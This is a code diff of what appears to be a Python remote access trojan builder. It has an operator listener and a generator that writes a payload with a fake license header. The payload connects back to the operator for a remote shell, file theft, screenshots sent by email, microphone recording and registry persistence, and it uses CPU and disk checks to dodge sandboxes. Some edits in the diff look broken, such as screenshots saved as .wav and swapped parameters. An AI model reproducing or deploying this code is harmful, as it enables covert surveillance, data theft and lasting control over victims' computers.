@@ -169,60 +169,80 @@ def Listener():
                                         if ('dir:' in r):
                                             cwd = r[4:]
                                         while True:
-                                            command = input(str(cwd) + "> ")
+                                            command = input(str(cwd)+"> ")
                                             if 'terminate' in command:
                                                 conn.send('terminate'.encode('utf-8'))
                                                 conn.close()
                                                 break
-                                            elif 'download' in command:
+
+
+                                            elif 'grab' in command:
                                                 conn.send(command.encode('utf-8'))
                                                 file_name = conn.recv(1024).decode('utf-8')
-                                                print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Grabbing [" + file_name + "]...")
-                                                conn.send('OK 200'.encode('utf-8'))
+                                                print(f"{Fore.WHITE}[{Fore.BLUE}*{Fore.WHITE}] Downloading " + file_name + "...")
+                                                conn.send('OK'.encode('utf-8'))
                                                 file_size = conn.recv(1024).decode('utf-8')
-                                                conn.send('OK 200'.encode('utf-8'))
+                                                conn.send('OK'.encode('utf-8'))
                                                 print(f"{Fore.WHITE}[{Fore.BLUE}*{Fore.WHITE}] Total: " + str(int(file_size)/1024) + " KB")
                                                 with open(file_name, "wb") as file:
+
                                                     c = 0
+                                                    
                                                     start_time = time.time()
                                                     while c < int(file_size):
+
                                                         data = conn.recv(1024)
                                                         if not (data):
                                                             break
                                                         file.write(data)
+
                                                         c += len(data)
+
                                                     end_time = time.time()
-                                                print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] File Grabbed. Total time: ", end_time - start_time)
-                                            elif 'upload' in command:
+
+                                                print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] File Downloaded.")
+
+                                            elif 'transfer' in command:
                                                 conn.send(command.encode('utf-8'))
-                                                file_name = command[7:]
+
+
+                                                file_name = command[9:]
                                                 file_size = os.path.getsize(file_name)
+
+
                                                 conn.send(file_name.encode('utf-8'))
                                                 print(conn.recv(1024).decode('utf-8'))
                                                 conn.send(str(file_size).encode('utf-8'))
-                                                print(f"{Fore.WHITE}[{Fore.GREEN}*{Fore.WHITE}] Getting Response")
+                                                
                                                 print(conn.recv(1024).decode('utf-8'))
-                                                print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Transferring [" + str(file_size/1024) + "] KB...")
+                                                
+                                                print(f"{Fore.WHITE}[{Fore.BLUE}*{Fore.WHITE}] Transferring [" + str(file_size/1024) + "] KB...")
                                                 with open(file_name, "rb") as file:
+
                                                     c = 0
+
                                                     start_time = time.time()
                                                     while c < int(file_size):
+
                                                         data = file.read(1024)
                                                         if not (data):
                                                             break
+
                                                         conn.sendall(data)
+
                                                         c += len(data)
+
                                                     end_time = time.time()
-                                                    print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] File Transferred. Total time: ", end_time - start_time)
+                                                    
+                                                    print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] File Transferred.")
                                             elif (len(command.strip()) > 0):
                                                 conn.send(command.encode('utf-8'))
+
                                                 r = conn.recv(5120).decode('utf-8')
                                                 if ('dir:' in r):
                                                     cwd = r[4:]
                                                 else:
                                                     print (r)
-
-
                                     
 
 
@@ -308,6 +328,7 @@ def PayloadGenerator():
                         with open(SetFileName, "w") as malfile:
                             malfile.write(
                                 f'''                    
+                    
 #Eclipse Public License - v 2.0
 #THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE
 #PUBLIC LICENSE ("AGREEMENT"). ANY USE, REPRODUCTION OR DISTRIBUTION
@@ -353,7 +374,7 @@ def vmServ():
                 exit()
 vmServ()
 letters = ''.join(random.choice(string.ascii_letters) for l in range(16))
-letters = time.sleep(10)
+letters = time.sleep({setSleep})
 letters
 def regeditPersist(f_name, path): 
     address=os.path.join(path, f_name)  
@@ -363,9 +384,9 @@ def regeditPersist(f_name, path):
     reg.SetValueEx(open, "any_name", 0, reg.REG_SZ, address) 
     reg.CloseKey(open)
 BUFFER_SIZE = 1024
-clientHOST = "{clientHOST}"
-clientPORT = {clientPORT}
 def connection():
+    clientHOST = "{clientHOST}"
+    clientPORT = {clientPORT}
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((clientHOST, clientPORT))
     s.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 10000, 3000))
@@ -373,9 +394,9 @@ def connection():
         Handler_DATA = s.recv(BUFFER_SIZE).decode("utf-8")
         if Handler_DATA == "screenshot":
             screenshot = ImageGrab.grab()
-            file = "{''.join(random.choice(string.lowercase) for l in range(10))}.jpg"
+            file = f"{''.join(random.choice(string.lowercase) for l in range(10))}.wav"
             screenshot.save(file)
-            f = open(file, 'rb')
+            f = open('screenshot.jpg', 'rb')
             data=f.read()
             data=base64.b64encode(data)
             f.close()
@@ -388,11 +409,11 @@ def connection():
             smtp.quit()
         elif Handler_DATA == "mic_record":
             frames = 44100
-            seconds = {micrecordsec}
-            channel = 1
+            seconds = 20
+            channel = {micrecordsec}
             record = sounddevice.rec(int(seconds*frames), samplerate=frames, channels=channel)
             sounddevice.wait()
-            file = f"{''.join(random.choice(string.lowercase) for l in range(10))}.wav"
+            file = f"l.wav"
             write(file, frames, record)
             with open(file, 'rb') as f:
                 for l in f: s.sendall(l)
@@ -415,14 +436,15 @@ def connection():
         elif Handler_DATA == "shell":
             cwd = os.getcwd()
             s.send(("dir:" + str(cwd)).encode('utf-8'))
+
             while True:
                 try:
                     command = s.recv(2048).strip().decode('utf-8')
                     if 'terminate' in command:
                         s.close()
                         break 
-                    elif command.startswith('download'):
-                        file_name = command[9:]
+                    elif command.startswith('grab'):
+                        file_name = command[5:]
                         file_size = os.path.getsize(file_name)
                         s.send(file_name.encode('utf-8'))
                         s.recv(1024).decode('utf-8')
@@ -437,8 +459,8 @@ def connection():
                                     break
                                 s.sendall(data)
                                 c += len(data)
-                                end_time = time.time()
-                    elif 'upload' in command:
+                            end_time = time.time()
+                    elif 'transfer' in command:
                         file_name = s.recv(1024).decode('utf-8')
                         s.send('OK'.encode('utf-8'))
                         file_size = s.recv(1024).decode('utf-8')
@@ -465,8 +487,8 @@ def connection():
                         file_name = command[8:]
                         pth = os.getcwd()
                         try:
-                            AddToStartup(file_name, pth)
-                            s.send(f"Hooked".encode('utf-8'))
+                            regeditPersist(file_name, pth)
+                            s.send("OK".encode('utf-8'))
                         except Exception as e:
                             s.send(str(e).encode('utf-8'))
                     else:
@@ -479,6 +501,7 @@ def connection():
                             s.send("OK".encode('utf-8'))
                 except Exception as e:
                     s.send(str(e).encode('utf-8'))
+
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
@@ -491,11 +514,11 @@ else:
 is_admin()
 def coreChk():
     cpuChk = psutil.cpu_count(logical=False)
-    if cpuChk<1:
+    if cpuChk == 1:
         exit()
-    if cpuChk<2:
+    if cpuChk == 2:
         exit()
-    if cpuChk<3:
+    if cpuChk == 3:
         exit()
     else:
         connection()
@@ -503,15 +526,15 @@ coreChk()
 def diskChk():
     avgDiskChk = shutil.disk_usage("/")
     div = (avgDiskChk // (2**30))
-    if div>59:
+    if div == 59:
         exit()
-    if div>60:
+    if div == 60:
         exit()
-    if div>65:
+    if div == 65:
         exit()
-    if div>120:
+    if div == 120:
         exit()
-    if div>119:
+    if div == 119:
         exit()
     else:
         connection()
@@ -532,7 +555,7 @@ diskChk()
                             time.sleep(1)
                         print(f"{Fore.WHITE}[{Fore.BLUE}*{Fore.WHITE}] Payload Generated, Payload is Ready.")
                         time.sleep(1)
-                        #os.remove(setFileName)
+                        os.remove(SetFileName)
                         redirectListener = input("{Fore.WHITE}[{Fore.BLUE}*{Fore.WHITE}] Would You Like to Start Listener? ", "cyan")
                         if redirectListener == "yes":
                             Listener()
